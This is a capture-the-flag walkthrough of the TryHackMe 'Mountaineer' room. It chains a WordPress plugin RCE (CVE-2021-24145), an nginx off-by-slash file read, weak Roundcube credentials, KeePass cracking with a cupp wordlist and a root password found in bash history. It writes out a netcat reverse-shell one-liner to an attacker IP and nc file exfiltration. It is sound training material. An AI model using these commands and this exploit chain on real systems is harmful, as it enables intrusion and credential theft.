---
title: "TryHackMe: Mountaineer"
author: jaxafed
categories: [TryHackMe]
tags: [web, nginx, file disclosure, roundcube, vhost, wordpress, wpscan, cupp, keepass]
render_with_liquid: false
media_subpath: /images/tryhackme_mountaineer/
image:
  path: room_image.webp
---

**Mountaineer** started by discovering a **WordPress** instance and identifying a plugin vulnerable to **authenticated RCE**. By exploiting the **nginx off-by-slash** vulnerability to read files on the server, we discovered a vhost running a **Roundcube** instance. After logging into **Roundcube** with predictable credentials, we found credentials for **WordPress**, along with some information about a user. Using the discovered **WordPress** credentials, we exploited the aforementioned plugin and gained a shell.

Next, we found a **KeePass** database belonging to the user we had information about. By utilizing this information to create a wordlist, we successfully uncovered the master password for the **KeePass** database. Inside, we found credentials for another user and switched to that user. Checking the user's **bash history**, we found the password for the **root** user, which allowed us to complete the room.

Lastly, I will also share how we could have gained a foothold by combining **WordPress**'s password reset functionality with the **nginx off-by-slash** vulnerability.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/mountaineerlinux){: .center }


## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.146.154
Nmap scan report for 10.10.146.154
Host is up (0.090s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 86:09:80:28:d4:ec:f1:f9:bc:a3:f7:bb:cc:0f:68:90 (ECDSA)
|_  256 82:5a:2d:0c:77:83:7c:ea:ae:49:37:db:03:5a:03:08 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- **22** (SSH)
- **80** (HTTP)

### Web 80

Upon checking `http://10.10.146.154/`, we encounter the default `nginx` page.

![Web 80 Index](web_80_index.webp){: width="1400" height="800" }

## Shell as www-data

### Enumerating WordPress

Fuzzing the application for directories, we discover the `/wordpress/` endpoint.

```console
$ ffuf -u 'http://10.10.146.154/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fs 162
...
wordpress               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 469ms]
```
{: .wrap }

Visiting `http://10.10.146.154/wordpress/`, we see a `WordPress` installation. However, it appears broken because `WordPress` is using the `mountaineer.thm` hostname to load resources. Therefore, we add it to our hosts file.

![Web 80 Wordpress](web_80_wordpress.webp){: width="1400" height="800" }

```console
10.10.146.154 mountaineer.thm
```
{: file="/etc/hosts" }

Now, visiting `http://mountaineer.thm/wordpress/`, we see the proper page. There are a couple of posts, but nothing interesting.

![Web 80 Wordpress Two](web_80_wordpress2.webp){: width="1400" height="800" }

Running `wpscan` to enumerate the `WordPress` installation.

```console
$ wpscan --url http://mountaineer.thm/wordpress/ -e ap,vt,tt,cb,dbe,u,m
```

From the output, we discover two important things.

First, the `WordPress` users:

```console
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] everest
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] montblanc
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] chooyu
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] k2
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Second, the `Modern Events Calendar Lite 5.16.2` plugin is installed.

```console
[+] modern-events-calendar-lite
 | Location: http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/
 | Last Updated: 2022-05-10T21:06:00.000Z
 | [!] The version is out of date, the latest version is 6.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.16.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/readme.txt
 | Confirmed By: Change Log (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'
```

Looking for vulnerabilities in the plugin, we come across two prominent ones:

- **CVE-2021-24946**: An unauthenticated blind SQL injection vulnerability. While the vulnerability is present and we are able to exploit it, unfortunately, we don't retrieve anything useful from the database, nor can we crack the hashes for the users.

- **CVE-2021-24145**: An authenticated **RCE** vulnerability due to arbitrary file upload. The plugin fails to properly check the imported files, allowing us to upload a `PHP` file using the `text/csv` content type. While we are not authenticated at this point, if we manage to find any credentials for `WordPress`, we can return to this.

### Nginx Off-By-Slash

Fuzzing the `/wordpress/` endpoint for directories, we discover an interesting directory: `/wordpress/images/`.

```console
$ ffuf -u 'http://mountaineer.thm/wordpress/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fs 162
...
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 113ms]
```
{: .wrap }

Checking this endpoint for the `nginx off-by-slash` vulnerability, we are able to read files from the server using the payload `/wordpress/images../`.

![Web 80 Nginx OBS](web_80_nginx_obs.webp){: width="1400" height="800" }

Using this to read the `/etc/nginx/sites-available/default` file, we discover a vhost: `adminroundcubemail.mountaineer.thm`.

![Web 80 Nginx OBS Two](web_80_nginx_obs2.webp){: width="1400" height="800" }

Additionally, inside the same file, we can see the cause of the vulnerability.

![Web 80 Nginx OBS Three](web_80_nginx_obs3.webp){: width="1400" height="800" }

We then add the discovered vhost to our hosts file.

```console
10.10.146.154 mountaineer.thm adminroundcubemail.mountaineer.thm
```
{: file="/etc/hosts" }

### Roundcube

Visiting `http://adminroundcubemail.mountaineer.thm/`, we see a `Roundcube` installation.

![Web 80 Roundcube](web_80_roundcube.webp){: width="1400" height="800" }

After trying a couple of weak passwords for the usernames we discovered, we successfully log in using `k2:k2`.

First, checking the email titled `To my favorite mountain out there` in our inbox, we obtain a password.

![Web 80 Roundcube Two](web_80_roundcube2.webp){: width="1400" height="800" }

Next, checking the `Getting to know you!` email in the sent section, we learn quite a bit about the `lhotse` user.

![Web 80 Roundcube Three](web_80_roundcube3.webp){: width="1400" height="800" }

### CVE-2021-24145

Now that we have a password, we test it against `WordPress` for the `k2` user at `http://mountaineer.thm/wordpress/wp-login.php`, and we see that it works.

![Web 80 Wordpress Login](web_80_wordpress_login.webp){: width="1400" height="800" }

Since we are now authenticated, we can revisit the `CVE-2021-24145` vulnerability. We can find a PoC for it [here](https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145).

```console
$ wget https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py

$ python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p th[REDACTED]ld

  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___|
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/

                * Wordpress Plugin Modern Events Calendar Lite RCE
                * @Hacker5preme


[+] Authentication successfull !

[+] Shell Uploaded to: http://mountaineer.thm:80/wordpress//wp-content/uploads/shell.php
```

After running the exploit, we can confirm its success by visiting `http://mountaineer.thm/wordpress/wp-content/uploads/shell.php`.

![Web 80 Wordpress Shell](web_80_wordpress_shell.webp){: width="1400" height="800" }

Running the command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f` in the `p0wny` shell, we obtain a shell as the `www-data` user.

![Web 80 Wordpress Shell Two](web_80_wordpress_shell2.webp){: width="1400" height="800" }

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.146.154] 48056
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@mountaineer:~/html/wordpress/wp-content/uploads$ export TERM=xterm
export TERM=xterm
www-data@mountaineer:~/html/wordpress/wp-content/uploads$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

www-data@mountaineer:~/html/wordpress/wp-content/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as kangchenjunga

### Discovering the KeePass Database

Checking the files in the home directories, we find a **KeePass** database at `/home/lhotse/Backup.kdbx`, owned by the `lhotse` user, which we are able to read.

```console
www-data@mountaineer:/home$ find . -type f 2>/dev/null
./kangchenjunga/.bash_history
./kangchenjunga/local.txt
./kangchenjunga/mynotes.txt
./nanga/ToDo.txt
./lhotse/Backup.kdbx

www-data@mountaineer:/home$ ls -la /home/lhotse/Backup.kdbx
-rwxrwxrwx 1 lhotse lhotse 2302 Apr  6  2024 /home/lhotse/Backup.kdbx
```

We can use `netcat` to transfer it to our machine.

```console
$ nc -lvnp 444 > Backup.kdbx
listening on [any] 444 ...
```

```console
www-data@mountaineer:/home$ nc 10.11.72.22 444 < /home/lhotse/Backup.kdbx
```

We can try to crack the master password for the database using `john`. 

First, we generate a hash for the database using `keepass2john`.

```console
$ keepass2john Backup.kdbx > keepass_hash
```

However, attempting to crack the hash with common wordlists does not yield any results.

### Generating a Custom Wordlist

Since the wordlists we have do not work, we can create a custom wordlist using the information we discovered in `Roundcube` for the `lhotse` user.

To generate our wordlist, we can use the `cupp` tool.

```
$ cupp -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Mount
> Surname: Lhotse
> Nickname: MrSecurity
> Birthdate (DDMMYYYY): 18051956

...

> Pet's name: Lhotsy
> Company name: BestMountainsInc

...

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mount.txt, counting 1926 words.
[+] Now load your pistolero with mount.txt and shoot! Good luck!
```

### Cracking the KeePass Master Password

Now that we have a better wordlist, we are successful in cracking the hash for the **KeePass** database.

```console
$ john keepass_hash --wordlist=mount.txt
...
Lh[REDACTED]85      (Backup)
...
```

### Discovering the Password for kangchenjunga

Using the master password we discovered to open the database, we find the password for the `kangchenjunga` user.

```console
$ kpcli --kdb Backup.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> cd wordpress-backup/
kpcli:/wordpress-backup> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. European Mountain
1. Sample Entry                                               keepass.info
2. Sample Entry #2                          keepass.info/help/kb/testform.
3. The "Security-Mindedness" mountain
kpcli:/wordpress-backup> show -f 3

Title: The "Security-Mindedness" mountain
Uname: kangchenjunga
 Pass: J9[REDACTED]tV
  URL:
Notes:
```

### Getting a Shell

Using the password, we can use **SSH** to obtain a shell as the `kangchenjunga` user and find the first flag at `/home/kangchenjunga/local.txt`.

```console
$ ssh kangchenjunga@mountaineer.thm
...
kangchenjunga@mountaineer:~$ id
uid=1006(kangchenjunga) gid=1006(kangchenjunga) groups=1006(kangchenjunga)
kangchenjunga@mountaineer:~$ wc -c local.txt
33 local.txt
```

## Shell as root

### Checking the Bash History

Reading the `mynotes.txt` file in the user's home directory, we find an interesting note about the `root` user using our current user's account.

```console
kangchenjunga@mountaineer:~$ ls -la
total 20
drwxr-xr-x  2 root          root          4096 Mar 18  2024 .
drwxr-xr-x 11 root          root          4096 Mar 16  2024 ..
-rw-r-----  1 kangchenjunga kangchenjunga  303 Mar 18  2024 .bash_history
-rw-r-----  1 root          kangchenjunga   33 Mar 16  2024 local.txt
-rw-r-----  1 kangchenjunga kangchenjunga  216 Mar 16  2024 mynotes.txt

kangchenjunga@mountaineer:~$ cat mynotes.txt
Those my notes:

1. Tell root stop using my account ! It's annoying !
2. Travel to Mars sometime, I heard there are great mountains there !
3. Make my password even harder to crack ! I don't want anyone to hack me !
```

We also see the `.bash_history` file, and upon reading it, we find some commands run by the `root` user, as well as the `root` user's password.

```console
kangchenjunga@mountaineer:~$ cat .bash_history
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th[REDACTED]ss
whoami
...
```

Using the password we discovered, we can switch to the `root` user and read the final flag at `/root/root.txt`.

```console
kangchenjunga@mountaineer:~$ su - root
Password:
root@mountaineer:~# id
uid=0(root) gid=0(root) groups=0(root)
root@mountaineer:~# wc -c /root/root.txt
33 /root/root.txt
```

## Alternative Way for Foothold

Instead of using `Roundcube` to discover credentials for `WordPress`, we can also utilize the password reset functionality of `WordPress` to achieve authentication.

First, we visit `http://mountaineer.thm/wordpress/wp-login.php` and click the `Lost your password?` button.

![Web 80 Wordpress Lost Password](web_80_wordpress_lost_password.webp){: width="1400" height="800" }

Then, we can request a password reset email for the `admin` user at `http://mountaineer.thm/wordpress/wp-login.php?action=lostpassword`.

![Web 80 Wordpress Lost Password Two](web_80_wordpress_lost_password2.webp){: width="1400" height="800" }

After that, by using the `nginx off-by-slash` vulnerability to read the `/var/mail/www-data` file, we can find the password reset email.

![Web 80 Wordpress Lost Password Three](web_80_wordpress_lost_password3.webp){: width="1400" height="800" }

Now, by going to the link in the email (`http://mountaineer.thm/wordpress/wp-login.php?action=rp&key=bRU7dYZe5mpV4cnVvfpJ&login=admin&wp_lang=en_US`), we are able to reset the password for the `admin` user.

![Web 80 Wordpress Lost Password Four](web_80_wordpress_lost_password4.webp){: width="1400" height="800" }

With this, we gain access to **WordPress** with the `Administrator` role and can obtain a shell as `www-data` by either uploading a malicious plugin or using the same exploit for `CVE-2021-24145` from before.

![Web 80 Wordpress Lost Password Five](web_80_wordpress_lost_password5.webp){: width="1400" height="800" }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>